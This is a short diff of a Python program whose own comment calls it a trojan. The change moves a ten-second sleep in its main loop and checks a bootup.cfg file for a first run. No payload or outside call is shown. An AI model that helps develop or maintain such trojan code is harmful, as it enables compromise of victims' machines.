@@ -185,7 +185,6 @@ def encode_run (decode_msglist,update_dt):
 
 # Main Function
 while True:
-	sleep(10)
 	if (not path.exists('bootup.cfg')):			#Checking if its first run of trojan
 		first_run()
 	else:
@@ -227,5 +226,4 @@ while True:
 		f.close()
 		if (encodeflg == 1):
 			num_encoded = encode_run(msglist,update_dt)
-		
-			
+	sleep(10)			
